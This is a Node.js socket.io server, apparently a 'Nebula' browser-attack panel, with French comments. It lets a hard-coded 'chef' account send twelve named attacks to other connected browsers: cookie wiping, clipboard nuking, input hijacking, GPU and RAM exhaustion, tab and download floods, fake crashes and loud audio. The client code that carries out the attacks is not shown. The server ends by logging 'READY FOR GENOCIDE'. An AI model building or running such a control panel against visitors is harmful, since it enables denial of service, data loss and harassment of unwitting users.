const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);

app.use(express.static(__dirname));
app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));

let registry = {};
io.on('connection', (s) => {
    s.on('init', (d) => {
        registry[s.id] = { id: s.id, name: d.name, chef: d.name === "toucheur2pp" };
        io.emit('sync', Object.values(registry));
    });

    // --- LE PANNEAU DES 12 PLAIES ---
    const attacks = [
        'atk_orbitor', 'atk_gpu_melt', 'atk_ram_eat', 'atk_tab_storm', 
        'atk_audio_rape', 'atk_history_flood', 'atk_download_hell', 
        'atk_input_hijack', 'atk_fake_crash', 'atk_cookie_wipe', 
        'atk_vibration_spam', 'atk_clipboard_nuke'
    ];

    attacks.forEach(type => {
        s.on(type, (targetId) => {
            if(registry[s.id]?.chef) io.to(targetId).emit('execute', { type, master: registry[s.id].name });
        });
    });

    s.on('chat', (m) => io.emit('chat', { n: registry[s.id].name, t: m }));
    s.on('disconnect', () => { delete registry[s.id]; io.emit('sync', Object.values(registry)); });
});
http.listen(3000, () => console.log("NEBULA V42 : READY FOR GENOCIDE"));
